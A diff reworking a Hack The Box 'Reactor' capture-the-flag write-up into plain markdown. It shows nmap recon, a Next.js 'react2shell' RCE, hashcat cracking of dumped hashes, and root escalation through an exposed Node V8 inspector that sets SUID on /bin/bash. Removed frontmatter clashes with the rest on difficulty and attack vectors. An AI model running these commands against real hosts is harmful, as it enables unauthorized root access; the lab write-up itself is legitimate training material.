@@ -1,194 +1,18 @@
----
-title: "Reactor - Hack The Box"
-target: "Reactor"
-os: "Linux"
-difficulty: "Medium"
-status: "Pwned"
-vectors: "Apache NiFi Processor Creation RCE, JVM Process Extraction, Custom Sudo Binary PrivEsc"
-tags:
-  - ciber
-  - htb
-  - apache-nifi
-  - jvm
-  - rce
-  - sudo
-synced: "2026-11-02 12:08"
----
+# Reactor
+
+**Platform:** Hack The Box · **Type:** Machine · **OS:** Linux · **Difficulty:** Easy
+
+> Next.js React Server Components RCE, Node.js V8 inspector exposed on a root process
 
 <p align="center">
   <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58c3b-0931-413d-9394-5fae4350ec4c-1778698333.png" alt="Reactor Avatar" width="220">
 </p>
 
-## Operating System: Linux
-![[Linux.png|70]]
-
-## Machine Metadata
-
-| Property | Value |
-| :--- | :--- |
-| **Machine ID** | 900 |
-| **Machine Name** | Reactor |
-| **IP Address** | N/A |
-| **Status** | Pwned |
-| **Active on HTB** | ✅ |
-| **User Flag** | ✅ |
-| **Root Flag** | ✅ |
-| **Difficulty** | Easy |
-| **Stars** | ⭐️ 4.1 |
-| **Created Note** | 2026-10-16 |
-| **Release Date** | 2026-05-23 |
-| **Tags** | #Enterprise_Network #Vulnerability_Assessment #Person #Weak_Credentials #Remote_Code_Execution #Deserialization #Sensitive_Data_Exposure #Python #JavaScript #SSH #NodeJS #SQLite #Linux #NextJS #Configuration_Analysis #Password_Cracking #Port_Forwarding #Common_Services #Software_&_OS_exploitation #Programming |
-
-<p style="display:none">
-id:: 900
-active:: True
-name:: Reactor
-os:: Linux
-user_flag:: True
-root_flag:: True
-difficulty_text:: Easy
-stars:: 4.1
-created:: 2026-10-16
-published:: 2026-05-23
-avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58c3b-0931-413d-9394-5fae4350ec4c-1778698333.png
-tags:: #Enterprise_Network #Vulnerability_Assessment #Person #Weak_Credentials #Remote_Code_Execution #Deserialization #Sensitive_Data_Exposure #Python #JavaScript #SSH #NodeJS #SQLite #Linux #NextJS #Configuration_Analysis #Password_Cracking #Port_Forwarding #Common_Services #Software_&_OS_exploitation #Programming
-</p>
-
-## Statistics
-
-### Radar Matrix
-```chartsview
-#-----------------#
-#- chart type    -#
-#-----------------#
-type: Radar
-
-#-----------------#
-#- chart data    -#
-#-----------------#
-data:
-  - item: "ENUM"
-    user: "user"
-    score: 5.1
-  - item: "REAL"
-    user: "user"
-    score: 5.4
-  - item: "CVE"
-    user: "user"
-    score: 6.4
-  - item: "CUSTOM"
-    user: "user"
-    score: 3.6
-  - item: "CTF"
-    user: "user"
-    score: 4.6
-  - item: "ENUM"
-    user: "author"
-    score: 0
-  - item: "REAL"
-    user: "author"
-    score: 0
-  - item: "CVE"
-    user: "author"
-    score: 0
-  - item: "CUSTOM"
-    user: "author"
-    score: 0
-  - item: "CTF"
-    user: "author"
-    score: 0
-
-#-----------------#
-#- chart options -#
-#-----------------#
-options:
-  xField: "item"
-  yField: "score"
-  seriesField: "user"
-  meta:
-    score:
-      alias: "Score"
-      min: 0
-      nice: true
-  xAxis:
-    line: null
-    tickLine: null
-  yAxis:
-    label: false
-    grid:
-      alternateColor: "rgba(0, 0, 0, 0.04)"
-  point: []
-  area: []
-```
-
-### Community Difficulty Rating
-```chartsview
-#-----------------#
-#- chart type    -#
-#-----------------#
-type: Column
-
-#-----------------#
-#- chart data    -#
-#-----------------#
-data:
-  - folder: "PIECE OF CAKE"
-    count: 1638
-  - folder: "VERY EASY"
-    count: 2103
-  - folder: "EASY"
-    count: 5385
-  - folder: "NOT TOO EASY"
-    count: 2711
-  - folder: "MEDIUM"
-    count: 1052
-  - folder: "A BIT HARD"
-    count: 318
-  - folder: "HARD"
-    count: 233
-  - folder: "EXTREMELY HARD"
-    count: 73
-  - folder: "INSANE"
-    count: 26
-  - folder: "BRAINFUCK"
-    count: 74
-
-#-----------------#
-#- chart options -#
-#-----------------#
-options:
-  xField: "folder"
-  yField: "count"
-  padding: auto
-  label:
-    position: "middle"
-    style:
-      opacity: 0.6
-      fontSize: 12
-  columnStyle:
-    fillOpacity: 0.5
-    lineWidth: 1
-    strokeOpacity: 0.7
-    shadowColor: "grey"
-    shadowBlur: 10
-    shadowOffsetX: 5
-    shadowOffsetY: 5
-  xAxis:
-    label:
-      autoHide: false
-      autoRotate: true
-  meta:
-    count:
-      alias: "Votes"
-```
-
----
-
 ## Reconnaissance
 
-We begin by scanning the target machine (`10.129.55.228`) with [[Recon - Nmap - Port Scanning and Host Discovery|Nmap]] to discover open ports. 
+We begin by scanning the target machine (`10.129.55.228`) with Nmap to discover open ports. 
 
-![[Pasted image 20260723143828.png]]
+![Pasted image 20260723143828](../../../Attachments/Pasted%20image%2020260723143828.png)
 
 ```bash
 sudo nmap -sS -T5 -p- -Pn 10.129.55.228 -vvv
@@ -304,12 +128,12 @@ The scan identifies an SSH service running on port 22 and an HTTP service powere
 
 Visiting the web application on port 3000, we observe a Next.js interface:
 
-![[Pasted image 20260723144306.png]]
-![[Pasted image 20260723144359.png]]
+![Pasted image 20260723144306](../../../Attachments/Pasted%20image%2020260723144306.png)
+![Pasted image 20260723144359](../../../Attachments/Pasted%20image%2020260723144359.png)
 
 Researching the framework version (Next.js 15.0.3) reveals it is vulnerable to **react2shell**, which allows us to achieve remote code execution (RCE) and extract system hashes.
 
-![[Pasted image 20260724154600.png]]
+![Pasted image 20260724154600](../../../Attachments/Pasted%20image%2020260724154600.png)
 
 After leveraging this exploit, we dump MD5 password hashes and crack them using `hashcat` with the `rockyou.txt` wordlist:
 
@@ -355,6 +179,7 @@ Dictionary cache hit:
 
 39d97110eafe2a9a68639812cd271e8e:reactor1
 Approaching final keyspace - workload adjusted.
+
 
 Session..........: hashcat
 Status...........: Exhausted
@@ -403,7 +228,7 @@ engineer@reactor:~$ cat user.txt
 
 ## Privilege Escalation
 
-To identify vectors for privilege escalation, we execute `linpeas.sh` on the system. Looking through the output, we spot a suspicious `node` process running as `root` with the V8 inspector enabled (exploited via [[Linux - PrivEsc - Node V8 Inspector|Node.js V8 Inspector Privilege Escalation]]):
+To identify vectors for privilege escalation, we execute `linpeas.sh` on the system. Looking through the output, we spot a suspicious `node` process running as `root` with the V8 inspector enabled (exploited via Node.js V8 Inspector Privilege Escalation):
 
 ```shell
 ════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
@@ -414,11 +239,11 @@ root        1391  0.0  1.1 1065756 45292 ?       Ssl  13:28   0:00 /usr/bin/node
 ...
 ```
 
-![[Pasted image 20260724163317.png]]
+![Pasted image 20260724163317](../../../Attachments/Pasted%20image%2020260724163317.png)
 
 The parameter `--inspect=127.0.0.1:9229` opens a debugging port that allows executing arbitrary JavaScript within the Node.js context. Because the process is running as root, any code we run through the inspector also executes as root. 
 
-We utilize a custom exploit script (`node_inspector_lpe.py`) to connect to the inspector's [[Web - Protocols - Unauthenticated WebSocket Terminal|WebSocket]]. First, we confirm our access by executing the `id` command:
+We utilize a custom exploit script (`node_inspector_lpe.py`) to connect to the inspector's WebSocket. First, we confirm our access by executing the `id` command:
 
 ```shell
 engineer@reactor:~$ python3 node_inspector_lpe.py --payload id
@@ -443,10 +268,11 @@ engineer@reactor:~$ python3 node_inspector_lpe.py --payload id
 
 uid=0(root) gid=0(root) groups=0(root)
 
+
 [*] Done.
 ```
 
-Next, we run the script with the `suid` payload. This runs `chmod +s /bin/bash`, setting the [[Linux - PrivEsc - SUID|SUID bit]] on the bash executable and allowing us to drop into a root shell:
+Next, we run the script with the `suid` payload. This runs `chmod +s /bin/bash`, setting the SUID bit on the bash executable and allowing us to drop into a root shell:
 
 ```shell
 engineer@reactor:~$ python3 node_inspector_lpe.py --payload suid
@@ -468,6 +294,8 @@ engineer@reactor:~$ python3 node_inspector_lpe.py --payload suid
 [*] Evaluating: require('child_process').execSync('chmod +s /bin/bash').toString()
 
 [+] Result:
+
+
 
 [*] SUID bit set. Now run:
       bash -p
@@ -495,13 +323,7 @@ Reactor highlights the dangers of using outdated or vulnerable web frameworks (N
 
 ---
 
-## Post-Engagement & Zettelkasten Notes
+## Key Takeaways
 
-### Key Takeaways & Defense
 - **Node.js V8 Inspector Security**: The V8 debugging inspector (`--inspect`) allows arbitrary JavaScript execution and must never be exposed or run with elevated root privileges.
 - **Local WebSocket Access**: Restrict WebSocket communication on administrative localhost ports to authenticated operators only.
-
-### Atomic Notes to Extract
-- [[Linux - PrivEsc - Node V8 Inspector|Node.js V8 Inspector Privilege Escalation]]
-- [[Web - Protocols - Unauthenticated WebSocket Terminal|WebSocket Exploitation]]
-- [[Linux - PrivEsc - SUID|SUID Exploitation]]
